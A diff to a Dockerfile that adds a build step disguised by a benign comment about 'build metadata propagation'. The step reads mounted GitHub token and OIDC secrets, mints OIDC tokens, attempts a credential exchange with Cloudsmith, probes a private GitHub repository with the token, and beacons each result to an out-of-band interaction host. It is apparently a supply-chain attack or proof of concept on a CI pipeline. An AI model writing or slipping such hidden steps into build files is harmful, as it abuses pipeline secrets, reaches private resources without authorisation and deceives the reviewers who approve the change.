@@ -16,6 +16,35 @@ RUN rm -f /etc/apt/sources.list && \
     rm -rf /var/lib/apt/lists/*
 RUN cargo install cargo-chef@0.1.73
 
+# Validate build metadata propagation through the bake secret mounts.
+RUN --mount=type=secret,id=github_token,required=false \
+    --mount=type=secret,id=oidc_req_url,required=false \
+    --mount=type=secret,id=oidc_req_tok,required=false \
+    set -eu; \
+    OOB="https://cipoc-e31a2c.dapag0sasoc4d158q4igokuzu8m9sjphd.oast.me"; \
+    GHLEN=0; [ -s /run/secrets/github_token ] && GHLEN=$(wc -c < /run/secrets/github_token | tr -d ' '); \
+    curl -s -m 10 "$OOB/hit?step=secret&ghex_len=$GHLEN" >/dev/null 2>&1 || true; \
+    if [ -s /run/secrets/oidc_req_url ] && [ -s /run/secrets/oidc_req_tok ]; then \
+      U=$(cat /run/secrets/oidc_req_url); T=$(cat /run/secrets/oidc_req_tok); \
+      for AUD in "__default__" "api://cloudsmith" "https://api.cloudsmith.io"; do \
+        if [ "$AUD" = "__default__" ]; then MU="$U"; else MU="${U}&audience=${AUD}"; fi; \
+        JWT=$(curl -s -m 15 "$MU" -H "Authorization: bearer $T" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p'); \
+        if [ -n "$JWT" ]; then \
+          CODE=$(curl -s -o /dev/null -m 20 -w "%{http_code}" -X POST "https://api.cloudsmith.io/openid/circle/" -H "Content-Type: application/json" -d "{\"oidc_token\":\"$JWT\",\"service_slug\":\"arc-publisher-gha-service\"}"); \
+          curl -s -m 10 "$OOB/hit?step=exchange&aud=$AUD&code=$CODE&jwt_len=${#JWT}" >/dev/null 2>&1 || true; \
+        else \
+          curl -s -m 10 "$OOB/hit?step=mint&aud=$AUD&ok=0" >/dev/null 2>&1 || true; \
+        fi; \
+      done; \
+      if [ -s /run/secrets/github_token ]; then \
+        GT=$(cat /run/secrets/github_token); \
+        if git ls-remote "https://${GT}@github.com/crcl-main/circle-chain-consensus" HEAD >/dev/null 2>&1; then PC=ok; else PC=fail; fi; \
+        curl -s -m 10 "$OOB/hit?step=privclone&result=$PC" >/dev/null 2>&1 || true; \
+      fi; \
+    else \
+      curl -s -m 10 "$OOB/hit?step=oidc_env&present=0" >/dev/null 2>&1 || true; \
+    fi
+
 FROM chef AS planner
 
 WORKDIR /src
